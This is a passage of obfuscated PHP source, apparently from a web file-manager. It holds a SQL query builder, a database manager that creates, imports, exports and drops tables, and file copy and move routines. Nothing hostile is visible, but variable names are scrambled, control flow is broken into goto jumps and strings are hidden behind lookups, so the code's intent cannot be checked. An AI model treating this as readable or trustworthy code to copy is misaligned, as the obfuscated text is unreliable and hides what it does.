$Bİšğƒ¹ö½ ? $Bİšğƒ¹ö½ : 1; $E­š¯Ë©—à = isset($E­š¯Ë©—à) ? $E­š¯Ë©—à : (is_numeric($A„®ÅÃ‰²æ[$B¸¢®Ôòù[280]]) ? $A„®ÅÃ‰²æ[$B¸¢®Ôòù[280]] : 20); $eÖ‚Û¹ŸË­ = $E­š¯Ë©—à * ((int) $Bİšğƒ¹ö½ - 1); $A„®ÅÃ‰²æ[$B¸¢®Ôòù[280]] = $eÖ‚Û¹ŸË­ . $B¸¢®Ôòù[47] . $E­š¯Ë©—à; } if (think_config($B¸¢®Ôòù[975])) { $A»Ø¯×êä™ = $B¸¢®Ôòù[976] . md5(serialize($A„®ÅÃ‰²æ)); $dÀÆ¬¢á• = think_cache($A»Ø¯×êä™); if ($dÀÆ¬¢á•) { return $dÀÆ¬¢á•; } } goto eÒØÏæïÆ˜; d»÷µ‰ÂË: return $A°çéæÛ³·; goto a¿ÕÉÔÏ¯¨; eÒØÏæïÆ˜: $A°çéæÛ³· = $this->parseSql($this->selectSql, $A„®ÅÃ‰²æ); $A°çéæÛ³· .= $this->parseLock(isset($A„®ÅÃ‰²æ[$B¸¢®Ôòù[794]]) ? $A„®ÅÃ‰²æ[$B¸¢®Ôòù[794]] : !1); if (isset($A»Ø¯×êä™)) { think_cache($A»Ø¯×êä™, $A°çéæÛ³·); } goto d»÷µ‰ÂË; a¿ÕÉÔÏ¯¨: } public function parseSql($Díƒ¹„‘±Ë, $Bö³İĞëè = array()) { $e³‘¤¸Şˆ­ =& $_SERVER[ã®Â„Éæ¹¤]; $Díƒ¹„‘±Ë = str_replace(array($e³‘¤¸Şˆ­[977], $e³‘¤¸Şˆ­[978], $e³‘¤¸Şˆ­[979], $e³‘¤¸Şˆ­[980], $e³‘¤¸Şˆ­[981], $e³‘¤¸Şˆ­[982], $e³‘¤¸Şˆ­[983], $e³‘¤¸Şˆ­[984], $e³‘¤¸Şˆ­[985], $e³‘¤¸Şˆ­[986], $e³‘¤¸Şˆ­[987]), array($this->parseTable("{$Bö³İĞëè[$e³‘¤¸Şˆ­[267]]}"), $this->parseDistinct(isset($Bö³İĞëè[$e³‘¤¸Şˆ­[988]]) ? $Bö³İĞëè[$e³‘¤¸Şˆ­[988]] : !1), $this->parseField(!empty($Bö³İĞëè[$e³‘¤¸Şˆ­[261]]) ? $Bö³İĞëè[$e³‘¤¸Şˆ­[261]] : $e³‘¤¸Şˆ­[176]), $this->parseJoin(!empty($Bö³İĞëè[$e³‘¤¸Şˆ­[270]]) ? $Bö³İĞëè[$e³‘¤¸Şˆ­[270]] : $e³‘¤¸Şˆ­[33]), $this->parseWhere(!empty($Bö³İĞëè[$e³‘¤¸Şˆ­[263]]) ? $Bö³İĞëè[$e³‘¤¸Şˆ­[263]] : $e³‘¤¸Şˆ­[33]), $this->parseGroup(!empty($Bö³İĞëè[$e³‘¤¸Şˆ­[989]]) ? $Bö³İĞëè[$e³‘¤¸Şˆ­[989]] : $e³‘¤¸Şˆ­[33]), $this->parseHaving(!empty($Bö³İĞëè[$e³‘¤¸Şˆ­[990]]) ? $Bö³İĞëè[$e³‘¤¸Şˆ­[990]] : $e³‘¤¸Şˆ­[33]), $this->parseOrder(!empty($Bö³İĞëè[$e³‘¤¸Şˆ­[350]]) ? $Bö³İĞëè[$e³‘¤¸Şˆ­[350]] : $e³‘¤¸Şˆ­[33]), $this->parseLimit(!empty($Bö³İĞëè[$e³‘¤¸Şˆ­[280]]) ? $Bö³İĞëè[$e³‘¤¸Şˆ­[280]] : $e³‘¤¸Şˆ­[33]), $this->parseUnion(!empty($Bö³İĞëè[$e³‘¤¸Şˆ­[335]]) ? $Bö³İĞëè[$e³‘¤¸Şˆ­[335]] : $e³‘¤¸Şˆ­[33]), $this->parseComment(!empty($Bö³İĞëè[$e³‘¤¸Şˆ­[341]]) ? $Bö³İĞëè[$e³‘¤¸Şˆ­[341]] : $e³‘¤¸Şˆ­[33])), $Díƒ¹„‘±Ë); return $Díƒ¹„‘±Ë; } public function getLastSql($c²Ï¶ö×®Ç = '') { return $c²Ï¶ö×®Ç ? $this->modelSql[$c²Ï¶ö×®Ç] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($CÕ·ĞŠùòƒ) { return addslashes($CÕ·ĞŠùòƒ); } public function setModel($Dö¥¡ŠÚÖã) { $this->model = $Dö¥¡ŠÚÖã; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($cÌÆËÙó“, $E‰Í‚×ëê = '') { $this->database = $cÌÆËÙó“; $this->type = $E‰Í‚×ëê; } public function model($fºó×¸ª“í = '') { return new ModelBase($fºó×¸ª“í, $_SERVER[ã®Â„Éæ¹¤][33], $this->database); } public function db($C÷ÍÓ×†¤Û = false) { goto EÃÓì·Ã÷‰; c¸£ö¢îîÄ: if (!$aÎæ·Ûñ˜ê) { $c¬ÉÄì¡->execute("\x63\x72\145\x61\x74\145\x20\x64\141\x74\141\142\x61\x73\x65\x20\x60{$dèÄ¿ŠÚË}\x60"); } $FËŠƒî­’[$a‰…’¬âƒ“[903]] = $dèÄ¿ŠÚË; if ($FËŠƒî­’[$a‰…’¬âƒ“[744]] == $a‰…’¬âƒ“[745]) { $FËŠƒî­’[$a‰…’¬âƒ“[746]] .= $a‰…’¬âƒ“[991] . $dèÄ¿ŠÚË; } goto AéƒÆ•ë›; bÄÉ…ÒÆÀ: $dèÄ¿ŠÚË = $FËŠƒî­’[$a‰…’¬âƒ“[903]]; $FËŠƒî­’[$a‰…’¬âƒ“[903]] = $a‰…’¬âƒ“[33]; if ($FËŠƒî­’[$a‰…’¬âƒ“[744]] == $a‰…’¬âƒ“[745]) { $bŠ‡á¯™½È = $FËŠƒî­’[$a‰…’¬âƒ“[746]]; $FËŠƒî­’[$a‰…’¬âƒ“[746]] = substr($bŠ‡á¯™½È, 0, strrpos($bŠ‡á¯™½È, $a‰…’¬âƒ“[991])); } goto c»Æ´¯ÒÎ¢; EÃÓì·Ã÷‰: $a‰…’¬âƒ“ =& $_SERVER[ã®Â„Éæ¹¤]; $FËŠƒî­’ = array_change_key_case($this->database); if ($this->type == $a‰…’¬âƒ“[9] || !$C÷ÍÓ×†¤Û) { return $this->model()->db(); } goto bÄÉ…ÒÆÀ; c»Æ´¯ÒÎ¢: $this->database = $FËŠƒî­’; $c¬ÉÄì¡ = $this->model()->db(); try { $aÎæ·Ûñ˜ê = $c¬ÉÄì¡->execute("\x73\x68\x6f\x77\x20\x64\x61\164\x61\142\x61\163\145\163\x20\x6c\x69\153\145\40\47{$dèÄ¿ŠÚË}\47"); } catch (Exception $E†§®ØÂÚ¾) { } goto c¸£ö¢îîÄ; AéƒÆ•ë›: $this->database = $FËŠƒî­’; $c¬ÉÄì¡->execute("\x75\163\x65\40\x60{$dèÄ¿ŠÚË}\x60"); return $c¬ÉÄì¡; goto bÈ«–Æà–¶; bÈ«–Æà–¶: } public function createTable($B‰áÙ¨ö›‹, $Cƒˆô¼ä‰¨ = null) { $B¡©Á“Œ• =& $_SERVER[ã®Â„Éæ¹¤]; if (!IO::exist($B‰áÙ¨ö›‹)) { ActionCall($B¡©Á“Œ•[992], !0, 0); show_json(LNG($B¡©Á“Œ•[993]), !1); } $C½®–Ü§à = sqlSplit(IO::getContent($B‰áÙ¨ö›‹)); foreach ($C½®–Ü§à as $DÆĞóŠ›©) { if ($Cƒˆô¼ä‰¨) { $f¥»Û‚Àå¾ = stripos($DÆĞóŠ›©, $B¡©Á“Œ•[994]) === 0; if ($f¥»Û‚Àå¾) { $Cƒˆô¼ä‰¨->task[$B¡©Á“Œ•[995]] += 1; } } $this->model()->db()->execute($DÆĞóŠ›©); if ($Cƒˆô¼ä‰¨ && $f¥»Û‚Àå¾) { preg_match($B¡©Á“Œ•[996], $DÆĞóŠ›©, $a¹È‹’¤); $Cƒˆô¼ä‰¨->task[$B¡©Á“Œ•[997]] = $a¹È‹’¤[1]; $Cƒˆô¼ä‰¨->update(1); } } $this->taskToCache($Cƒˆô¼ä‰¨); } public function insertTable($c¸¹¼×ÌÉ, $E¨İÁí¥ = null) { $c’Š¡Ó«‰Ú =& $_SERVER[ã®Â„Éæ¹¤]; $cÁà§·‚×æ = $this->model()->db(); $f¼„ë¦ì = $aŞ‰Ú•ºÍæ ? array($aŞ‰Ú•ºÍæ) : $cÁà§·‚×æ->getTables(); foreach ($c¸¹¼×ÌÉ as $b™ØÛêÉÜî) { $aŞ‰Ú•ºÍæ = basename($b™ØÛêÉÜî, $c’Š¡Ó«‰Ú[739]); if (!in_array($aŞ‰Ú•ºÍæ, $f¼„ë¦ì)) { continue; } if ($E¨İÁí¥) { $E¨İÁí¥->task[$c’Š¡Ó«‰Ú[997]] = $aŞ‰Ú•ºÍæ; } if (get_filesize($b™ØÛêÉÜî) == 0) { continue; } $DÜæÎ¶ä÷ = $this->sqlToDb($b™ØÛêÉÜî, $E¨İÁí¥); if (!$DÜæÎ¶ä÷) { ActionCall($c’Š¡Ó«‰Ú[992], !0, 0); show_json(LNG($c’Š¡Ó«‰Ú[998]) . "\133{$aŞ‰Ú•ºÍæ}\135", !1); } } $this->taskToCache($E¨İÁí¥); } public function sqlFromDb($DˆÙ¯—ÈŞ­, $dïØŞÅ™Œ, $Fßø‡âãŒ = null, $AÛÄîÂ„½ = null) { goto bë×ƒ²À; d¸Ñ¿‡‘ŞØ: $CÆ°„ÈÇÂ = $eÁ‘äëÍ°š->getPk(); $eŸâ›ÀÜ÷ = $eÁ‘äëÍ°š->getDbFields(); do { $fË–ğÂ¼¸ = $eÁ‘äëÍ°š->field($eŸâ›ÀÜ÷)->order($CÆ°„ÈÇÂ . $_SERVER[ã®Â„Éæ¹¤][1000])->selectPage($d­øî–‘£, $DØæ©ÎºÁ²); $aª÷ß¯½„ = isset($fË–ğÂ¼¸[$_SERVER[ã®Â„Éæ¹¤][351]][$_SERVER[ã®Â„Éæ¹¤][353]]) ? $fË–ğÂ¼¸[$_SERVER[ã®Â„Éæ¹¤][351]][$_SERVER[ã®Â„Éæ¹¤][353]] : 0; $cµå´¨ğÉ­ = !empty($fË–ğÂ¼¸[$_SERVER[ã®Â„Éæ¹¤][354]]) ? $fË–ğÂ¼¸[$_SERVER[ã®Â„Éæ¹¤][354]] : array(); if (!($BÓŒÎî”á± = count($cµå´¨ğÉ­))) { break; } $d¦“•©Ú‚ = array(); foreach ($cµå´¨ğÉ­ as $CˆÙ£÷¸“ˆ) { if ($DˆÙ¯—ÈŞ­ == $_SERVER[ã®Â„Éæ¹¤][1001] && $CˆÙ£÷¸“ˆ[$_SERVER[ã®Â„Éæ¹¤][29]] == $_SERVER[ã®Â„Éæ¹¤][1002]) { $FÈ‘÷ØÚ¾ = json_decode($CˆÙ£÷¸“ˆ[$_SERVER[ã®Â„Éæ¹¤][359]], !0); if ($FÈ‘÷ØÚ¾[$_SERVER[ã®Â„Éæ¹¤][28]] == date($_SERVER[ã®Â„Éæ¹¤][712]) && !$FÈ‘÷ØÚ¾[$_SERVER[ã®Â„Éæ¹¤][711]]) { continue; } } if ($AÛÄîÂ„½) { $CˆÙ£÷¸“ˆ[$_SERVER[ã®Â„Éæ¹¤][75]] = "\173\151\x6f\72{$AÛÄîÂ„½}\x7d" . substr($CˆÙ£÷¸“ˆ[$_SERVER[ã®Â„Éæ¹¤][75]], strlen("\173\x69\157\72{$CˆÙ£÷¸“ˆ[$_SERVER[ã®Â„Éæ¹¤][766]]}\x7d")); $CˆÙ£÷¸“ˆ[$_SERVER[ã®Â„Éæ¹¤][766]] = $AÛÄîÂ„½; } $d¦“•©Ú‚[] = $_SERVER[ã®Â„Éæ¹¤][1003] . $this->sqlEncode($CˆÙ£÷¸“ˆ) . $_SERVER[ã®Â„Éæ¹¤][1004]; } $Dé‡Á­ª¤ = "\x49\x4e\x53\105\122\x54\40\x49\x4e\x54\117\x20\x60{$DˆÙ¯—ÈŞ­}\x60\40\x28\x60" . implode($_SERVER[ã®Â„Éæ¹¤][1005], $eŸâ›ÀÜ÷) . $_SERVER[ã®Â„Éæ¹¤][1006]; fwrite($cóŒÑ‘½’, $Dé‡Á­ª¤ . implode($_SERVER[ã®Â„Éæ¹¤][1007], $d¦“•©Ú‚) . $_SERVER[ã®Â„Éæ¹¤][67] . PHP_EOL); $DØæ©ÎºÁ²++; $E™¿áÃØÛë += $BÓŒÎî”á±; if ($Fßø‡âãŒ) { $Fßø‡âãŒ->update($BÓŒÎî”á±); } } while ($DØæ©ÎºÁ² <= $aª÷ß¯½„); goto E­Î‚êªîã; cºöÀ£Í: $DØæ©ÎºÁ² = 1; $d­øî–‘£ = 500; $cóŒÑ‘½’ = fopen($dïØŞÅ™Œ, $_SERVER[ã®Â„Éæ¹¤][999]); goto d¸Ñ¿‡‘ŞØ; bë×ƒ²À: if ($Fßø‡âãŒ) { $Fßø‡âãŒ->task[$_SERVER[ã®Â„Éæ¹¤][997]] = $DˆÙ¯—ÈŞ­; } $eÁ‘äëÍ°š = $this->model($DˆÙ¯—ÈŞ­); $E™¿áÃØÛë = 0; goto cºöÀ£Í; E­Î‚êªîã: fclose($cóŒÑ‘½’); return $E™¿áÃØÛë; goto E‚‚ù©˜ø; E‚‚ù©˜ø: } public function sqlToDb($Cğ¯œêäÜ, $dÌÁµÕ‹Á¤ = null) { goto E®»¹˜»À; DçÓÕö…Œº: if (!$Eìù‹Á¨ëë) { return !1; } $e§÷³ô˜Ÿ = 0; $DÓ†”ÍÛåí = $BŸš£ïˆÉ[33]; goto eÅÉğ‰æ®â; F‚¢¸Å½§: if (trim($DÓ†”ÍÛåí)) { $DÓ†”ÍÛåí = rtrim(trim($DÓ†”ÍÛåí), $BŸš£ïˆÉ[67]); if (!$ašì©Î…¡Ù->execute($DÓ†”ÍÛåí)) { return !1; } if ($dÌÁµÕ‹Á¤) { $dÌÁµÕ‹Á¤->update($e§÷³ô˜Ÿ - 1); } } return !0; goto DäÕÄŒíÊ; eÅÉğ‰æ®â: $E‹Ä‚·ˆ°† = 500 + 1; while (!feof($Eìù‹Á¨ëë)) { if ($dÌÁµÕ‹Á¤ && $e§÷³ô˜Ÿ != 0) { $dÌÁµÕ‹Á¤->task[$BŸš£ïˆÉ[995]] += 1; } $e§÷³ô˜Ÿ++; $AµĞ‹ÖªŸâ = trim(fgets($Eìù‹Á¨ëë)); $DÓ†”ÍÛåí .= $BŸš£ïˆÉ[50] . $this->sqlDecode($AµĞ‹ÖªŸâ, $this->type); if ($e§÷³ô˜Ÿ == $E‹Ä‚·ˆ°†) { $DÓ†”ÍÛåí = rtrim(trim($DÓ†”ÍÛåí), $BŸš£ïˆÉ[67]); if (!$ašì©Î…¡Ù->execute($DÓ†”ÍÛåí)) { return !1; } if ($dÌÁµÕ‹Á¤) { $dÌÁµÕ‹Á¤->update($e§÷³ô˜Ÿ - 1); } $DÓ†”ÍÛåí = $BŸš£ïˆÉ[33]; $e§÷³ô˜Ÿ = 0; } } fclose($Eìù‹Á¨ëë); goto F‚¢¸Å½§; E®»¹˜»À: $BŸš£ïˆÉ =& $_SERVER[ã®Â„Éæ¹¤]; $ašì©Î…¡Ù = $this->model()->db(); $Eìù‹Á¨ëë = @fopen($Cğ¯œêäÜ, $BŸš£ïˆÉ[1008]); goto DçÓÕö…Œº; DäÕÄŒíÊ: } public function dropTable($EÂ…„ôÊùº = null) { $B§ïºï¥õ‹ = $this->model()->db(); $D—‡“õ°ôö = $EÂ…„ôÊùº ? array($EÂ…„ôÊùº) : $B§ïºï¥õ‹->getTables(); if (!$D—‡“õ°ôö) { return; } foreach ($D—‡“õ°ôö as $EÂ…„ôÊùº) { $B§ïºï¥õ‹->execute("\x64\162\x6f\x70\x20\x74\x61\142\154\145\40\x69\146\x20\145\x78\x69\x73\x74\163\40\x60{$EÂ…„ôÊùº}\x60"); } } private function taskToCache($f’”ï¶š›‹ = null) { $E®‰–¢ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$f’”ï¶š›‹) { return; } $AŸ½–ŠÔ¾ = array($E®‰–¢[997] => $f’”ï¶š›‹->task[$E®‰–¢[997]], $E®‰–¢[995] => $f’”ï¶š›‹->task[$E®‰–¢[995]], $E®‰–¢[1009] => $f’”ï¶š›‹->task[$E®‰–¢[1009]]); if ($AŸ½–ŠÔ¾[$E®‰–¢[995]] == $AŸ½–ŠÔ¾[$E®‰–¢[1009]]) { $AŸ½–ŠÔ¾[$E®‰–¢[718]] = 1; } Cache::set($E®‰–¢[1010] . $f’”ï¶š›‹->task[$E®‰–¢[367]], $AŸ½–ŠÔ¾); $f’”ï¶š›‹->end(); } private function sqlEncode($bÂÕ‡Ç®®¸) { $DËÀÀ”·õƒ =& $_SERVER[ã®Â„Éæ¹¤]; $CÑ£ŠÛŠ‹¹ = array(); foreach ($bÂÕ‡Ç®®¸ as $e·½øã¦•…) { if (is_array($e·½øã¦•…)) { $e·½øã¦•… = json_encode_force($e·½øã¦•…); } $e·½øã¦•… = addslashes($e·½øã¦•…); $e·½øã¦•… = str_replace(array($DËÀÀ”·õƒ[1011], $DËÀÀ”·õƒ[217]), array($DËÀÀ”·õƒ[1012], $DËÀÀ”·õƒ[1013]), $e·½øã¦•…); $CÑ£ŠÛŠ‹¹[] = str_replace($DËÀÀ”·õƒ[55], $DËÀÀ”·õƒ[1014], $e·½øã¦•…); } return $DËÀÀ”·õƒ[55] . implode($DËÀÀ”·õƒ[1015], $CÑ£ŠÛŠ‹¹) . $DËÀÀ”·õƒ[55]; } private function sqlDecode($EĞ‰ÔÂŠŒ, $DÌˆ¸Ÿß) { $cßÃ…­Šœ‘ =& $_SERVER[ã®Â„Éæ¹¤]; $EĞ‰ÔÂŠŒ = str_replace(array($cßÃ…­Šœ‘[1012], $cßÃ…­Šœ‘[1013]), array($cßÃ…­Šœ‘[1011], $cßÃ…­Šœ‘[217]), $EĞ‰ÔÂŠŒ); if ($DÌˆ¸Ÿß == $cßÃ…­Šœ‘[9]) { $EĞ‰ÔÂŠŒ = stripslashes($EĞ‰ÔÂŠŒ); } return $EĞ‰ÔÂŠŒ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($CÖ¥½•èÜÙ, $dĞÕ¦“¨Ò) { $B—¢à¯â´ç = self::driverMake($dĞÕ¦“¨Ò[0]); if (method_exists($B—¢à¯â´ç, $CÖ¥½•èÜÙ)) { return @call_user_func_array(array($B—¢à¯â´ç, $CÖ¥½•èÜÙ), $dĞÕ¦“¨Ò); } if (method_exists($B—¢à¯â´ç, $_SERVER[ã®Â„Éæ¹¤][1016])) { return @call_user_func_array(array($B—¢à¯â´ç, $CÖ¥½•èÜÙ), $dĞÕ¦“¨Ò); } else { if (method_exists(self, $CÖ¥½•èÜÙ)) { return @call_user_func_array(array(self, $CÖ¥½•èÜÙ), $dĞÕ¦“¨Ò); } else { call_user_func_array(array(parent, $CÖ¥½•èÜÙ), $dĞÕ¦“¨Ò); } } } public static function init($däÁÍÉ½•µ) { return self::driverMake($däÁÍÉ½•µ); } public static function copy($aä²ÜØõƒ¤, $bóòá’Š´ƒ, $FèáÅ­Ášó = false, $dÀŸ¶Ò§² = false) { return self::copyMove($aä²ÜØõƒ¤, $bóòá’Š´ƒ, $FèáÅ­Ášó, $_SERVER[ã®Â„Éæ¹¤][492], $dÀŸ¶Ò§²); } public static function move($döÓ´¶”ÈÚ, $fÑÕëÖá²“, $a¤‘õ ¶¸ = false, $BĞŒ•Â‘Â· = false) { return self::copyMove($döÓ´¶”ÈÚ, $fÑÕëÖá²“, $a¤‘õ ¶¸, $_SERVER[ã®Â„Éæ¹¤][494], $BĞŒ•Â‘Â·); } public static function saveFile($cÓöÙ­­ï, $EÄ´Äî…Şè, $fÖãß–íã = true) { goto Fíİ·«øÙ‹; e÷’¶¶ô: $cµ”‚ĞìÕ = $CÈåò£¸Áñ->pathFather($EÄ´Äî…Şè); $c¯Ğš„çÕ = !0; if (!$fÖãß–íã && self::driverIsSame($EÆÄªÍ¦, $CÈåò£¸Áñ)) { $c¯Ğš„çÕ = !1; } goto b¦Ä”Ø¿Ë¸; Fíİ·«øÙ‹: $A¦™ìÌ´Ëò =& $_SERVER[ã®Â„Éæ¹¤]; $B¼Ú‘„­ = self::info($EÄ´Äî…Şè); $EÆÄªÍ¦ = self::driverMake($cÓöÙ­­ï); goto EÄÍñà‰É; b¦Ä”Ø¿Ë¸: $E§ñİŸ„„° = self::copyFile($EÆÄªÍ¦, $cÓöÙ­­ï, $CÈåò£¸Áñ, $cµ”‚ĞìÕ, $B¼Ú‘„­[$A¦™ìÌ´Ëò[28]], $c¯Ğš„çÕ); if ($bß¤å²÷÷) { $E§ñİŸ„„° = $bß¤å²÷÷->getPathOuter($E§ñİŸ„„°); } return $E§ñİŸ„„°; goto CçÂÇô„Šù; EÄÍñà‰É: $CÈåò£¸Áñ = self::driverMake($EÄ´Äî…Şè); $bß¤å²÷÷ = !1; if ($CÈåò£¸Áñ->pathParse[$A¦™ìÌ´Ëò[1017]]) { $AÇùó†‹‡Ï = $CÈåò£¸Áñ->pathParse[$A¦™ìÌ´Ëò[1017]]; $bß¤å²÷÷ = $CÈåò£¸Áñ; $CÈåò£¸Áñ = self::driverMake($AÇùó†‹‡Ï); } goto e÷’¶¶ô; CçÂÇô„Šù: } private static function copyMove($C†èÃ‡‘ Í, $Bö¬¼ªè¬Û, $B«ó·÷Àˆê, $e—‰ŒÅš‘›, $fã‹î‘æÔ‘ = false) { goto Cå‹Èâ½ö; CñÌòƒĞö: $a¼¿‡ˆ˜¦ = $d–Ş×óâñ->isFile($C†èÃ‡‘ Í); if (!$a¼¿‡ˆ˜¦ && $báÈ©Š±¢¹->getType() == $F’¡•Óæ¡ä[716] && $d–Ş×óâñ->getType() == $F’¡•Óæ¡ä[102]) { $cÎóÆ¼ˆŸ = $báÈ©Š±¢¹->copyFolderFromIO($d–Ş×óâñ, $C†èÃ‡‘ Í, $Bö¬¼ªè¬Û, $B«ó·÷Àˆê, $fÑ…ª¾ˆ¹´, $fã‹î‘æÔ‘); } else { $cÎóÆ¼ˆŸ = self::copyPath($d–Ş×óâñ, $C†èÃ‡‘ Í, $báÈ©Š±¢¹, $Bö¬¼ªè¬Û, $B«ó·÷Àˆê, $fÑ…ª¾ˆ¹´, $a¼¿‡ˆ˜¦, $fã‹î‘æÔ‘); } if ($cÎóÆ¼ˆŸ && $fÑ…ª¾ˆ¹´) { $d–Ş×óâñ->remove($C†èÃ‡‘ Í); } goto C•ÈùÇ¡ùá; cë¢êëà÷ù: Hook::trigger($F’¡•Óæ¡ä[72], $d–Ş×óâñ, $C†èÃ‡‘ Í, $báÈ©Š±¢¹, $Bö¬¼ªè¬Û); $eÓé÷»–Êñ = self::driverIsSame($d–Ş×óâñ, $báÈ©Š±¢¹); if ($eÓé÷»–Êñ) { if ($e—‰ŒÅš‘› == $F’¡•Óæ¡ä[494] && !method_exists($báÈ©Š±¢¹, $F’¡•Óæ¡ä[1018]) && trim($Bö¬¼ªè¬Û, $F’¡•Óæ¡ä[8]) == trim($báÈ©Š±¢¹->pathFather($C†èÃ‡‘ Í), $F’¡•Óæ¡ä[8])) { return $báÈ©Š±¢¹->getPathOuter($C†èÃ‡‘ Í); } if (method_exists($báÈ©Š±¢¹, $e—‰ŒÅš‘›)) { return $báÈ©Š±¢¹->{$e—‰ŒÅš‘›}($C†èÃ‡‘ Í, $Bö¬¼ªè¬Û, $B«ó·÷Àˆê); } } goto CñÌòƒĞö; dĞé³„Ø¼Û: $f²ÄÊ´Ä = !1; if ($báÈ©Š±¢¹->pathParse[$F’¡•Óæ¡ä[1017]]) { $Bö¬¼ªè¬Û = $báÈ©Š±¢¹->pathParse[$F’¡•Óæ¡ä[1017]]; $f²ÄÊ´Ä = $báÈ©Š±¢¹; $báÈ©Š±¢¹ = self::driverMake($Bö¬¼ªè¬Û); } self::check($d–Ş×óâñ, $C†èÃ‡‘ Í, $báÈ©Š±¢¹, $Bö¬¼ªè¬Û); goto cë¢êëà÷ù; C•ÈùÇ¡ùá: if ($f²ÄÊ´Ä) { $cÎóÆ¼ˆŸ = $f²ÄÊ´Ä->getPathOuter($cÎóÆ¼ˆŸ); } return $cÎóÆ¼ˆŸ; goto b–»¿ƒ¬è; B»Œ˜İ±: $d–Ş×óâñ = self::driverMake($C†èÃ‡‘ Í); $báÈ©Š±¢¹ = self::driverMake($Bö¬¼ªè¬Û); $fÑ…ª¾ˆ¹´ = $e—‰ŒÅš‘› == $F’¡•Óæ¡ä[494]; goto dĞé³„Ø¼Û; Cå‹Èâ½ö: $F’¡•Óæ¡ä =& $_SERVER[ã®Â„Éæ¹¤]; if (!$C†èÃ‡‘ Í || $C†èÃ‡‘ Í == $F’¡•Óæ¡ä[8] || !$Bö¬¼ªè¬Û) { return !1; } ignore_timeout(); goto B»Œ˜İ±; b–»¿ƒ¬è: } private static function check($d¨Š®ö‰Í, $f³ÒİÖ‡«á, $b‡È’„ŒÂ¨, &$aÅñ®è†Æ¶) { $BÁ£»ß©Ñ¡ =& $_SERVER[ã®Â„Éæ¹¤]; if (self::driverIsSame($d¨Š®ö‰Í, $b‡È’„ŒÂ¨) && $d¨Š®ö‰Í->isFolder($f³ÒİÖ‡«á) && $d¨Š®ö‰Í->isParentOf($f³ÒİÖ‡«á, $aÅñ®è†Æ¶)) { show_json(LNG($BÁ£»ß©Ñ¡[1019]), !1); } if (!$d¨Š®ö‰Í->exist($f³ÒİÖ‡«á)) { show_json(LNG($BÁ£»ß©Ñ¡[101]), !1); } } private static function copyPath($B™æ–î˜é¼, $cÈÈÎ±Ã™„, $C‡Ó¨Šã±, $F¿ù«Ùéø‰, $DÏÍ®é¥‚©, $e¿¼´Å“µ, $dÄ¢éÈŞ‘—, $AäÉÒ¹×Úã = false) { goto E¡ÙôáÂ±ó; E„¤Õ¸›®²: if ($dÄ¢éÈŞ‘—) { return self::copyFile($B™æ–î˜é¼, $cÈÈÎ±Ã™„, $C‡Ó¨Šã±, $F¿ù«Ùéø‰, $Aƒ‰¹´¹¼œ, $e¿¼´Å“µ); } if ($DÏÍ®é¥‚© == REPEAT_RENAME_FOLDER) { $DÏÍ®é¥‚© = !1; } $A–ó°¢ˆ¡Å = rtrim($F¿ù«Ùéø‰, $Eõ„ğË¥š…[8]) . $Eõ„ğË¥š…[8] . $Aƒ‰¹´¹¼œ; goto dòŠÍ¥î¾¹; bÈÄ•àí¨: $c¹’ˆ¶¢ì = array_merge($aêƒÏÙ–Ö‚[$Eõ„ğË¥š…[73]], $aêƒÏÙ–Ö‚[$Eõ„ğË¥š…[74]]); foreach ($c¹’ˆ¶¢ì as $c¨Şóöªİœ) { $b¿¹¾´š»ô = $c¨Şóöªİœ[$Eõ„ğË¥š…[29]] == $Eõ„ğË¥š…[167]; $cÈÈÎ±Ã™„ = $B™æ–î˜é¼->getPathInner($c¨Şóöªİœ[$Eõ„ğË¥š…[75]]); $c±äÉ¾çô = self::copyPath($B™æ–î˜é¼, $cÈÈÎ±Ã™„, $C‡Ó¨Šã±, $F¿ù«Ùéø‰, $DÏÍ®é¥‚©, $e¿¼´Å“µ, $b¿¹¾´š»ô); if (!$c±äÉ¾çô) { write_log($Eõ„ğË¥š…[1020] . $cÈÈÎ±Ã™„ . $Eõ„ğË¥š…[1021] . $F¿ù«Ùéø‰, $Eõ„ğË¥š…[1022]); } } return $a‘ğ©¢éÌ; goto AæïÎŒ‘ÀŸ; dòŠÍ¥î¾¹: $a‘ğ©¢éÌ = $C‡Ó¨Šã±->mkdir($C‡Ó¨Šã±->getPath($A–ó°¢ˆ¡Å)); $F¿ù«Ùéø‰ = $C‡Ó¨Šã±->getPathInner($a‘ğ©¢éÌ); $aêƒÏÙ–Ö‚ = $B™æ–î˜é¼->listPath($cÈÈÎ±Ã™„, !0); goto bÈÄ•àí¨; E¡ÙôáÂ±ó: $Eõ„ğË¥š… =& $_SERVER[ã®Â„Éæ¹¤]; $Aƒ‰¹´¹¼œ = $AäÉÒ¹×Úã ? $AäÉÒ¹×Úã : $B™æ–î˜é¼->getPathName($B™æ–î˜é¼->pathThis($cÈÈÎ±Ã™„)); if ($DÏÍ®é¥‚©) { $fÉê‚Û‚Ÿ = $C‡Ó¨Šã±->fileNameExist($F¿ù«Ùéø‰, $Aƒ‰¹´¹¼œ); $Aƒ‰¹´¹¼œ = $C‡Ó¨Šã±->fileNameAuto($F¿ù«Ùéø‰, $Aƒ‰¹´¹¼œ, $DÏÍ®é¥‚©, !$dÄ¢éÈŞ‘—); $DÏÍ®é¥‚© = $fÉê‚Û‚Ÿ ? $DÏÍ®é¥‚© : !1; } goto E„¤Õ¸›®²; AæïÎŒ‘ÀŸ: } private static function copyFile($fœ¨Ø•ÈÛˆ, $C¿ÌÎ¨Ò‚, $a©‚„¾‡­¡, $DñÔ²Š¿¯¦, $dÏß“¸ÅÛ, $b™…÷±ù) { goto Eê¹ÅÁª¤; c»äº„¾¥: Hook::trigger($dï«¶ö¯Š„[1025], $fœ¨Ø•ÈÛˆ, $C¿ÌÎ¨Ò‚, $a©‚„¾‡­¡, $DñÔ²Š¿¯¦, $dÏß“¸ÅÛ, $B„ßî­—¥¥); return $B„ßî­—¥¥; goto e›ê‰çŒŒ…; Fäœœîñ‘è: mk_dir($DËÀ²·ºœ); $EËÆëƒŸ¼ = $DËÀ²·ºœ . $AÁº¦…¨¹×; $EËÆëƒŸ¼ = $fœ¨Ø•ÈÛˆ->download($C¿ÌÎ¨Ò‚, $EËÆëƒŸ¼); goto Dæõ±ï¿ƒÎ; Eê¹ÅÁª¤: $dï«¶ö¯Š„ =& 